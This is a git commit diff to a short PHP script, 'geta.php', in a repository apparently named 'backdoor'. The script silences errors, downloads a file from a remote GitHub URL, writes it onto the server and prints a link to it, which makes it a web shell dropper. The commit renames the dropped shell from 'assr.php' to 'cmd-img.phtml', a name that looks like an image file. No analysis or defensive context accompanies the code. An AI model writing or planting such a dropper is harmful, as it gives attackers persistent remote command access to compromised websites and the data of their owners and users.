fddfd3ec65a8871d38cab9f1f89d954854bf9d34
Kakaroot 1337 <38699989+kakaroot1337@users.noreply.github.com>
2023-08-09 10:39:33 +0700

    Update geta.php

--- geta.php
+++ geta.php
@@ -1,8 +1,8 @@
 <?php
 error_reporting(0);
-$shell = fopen("assr.php", "w");
-$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/assr.php");
+$shell = fopen("cmd-img.phtml", "w");
+$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/cmd-img.phtml");
 fwrite($shell, $file_shell);
 fclose($shell);
-echo "<a href='assr.php'>Here Boyz</a>";
+echo "<a href='cmd-img.phtml'>Here Boyz</a>";
 ?>
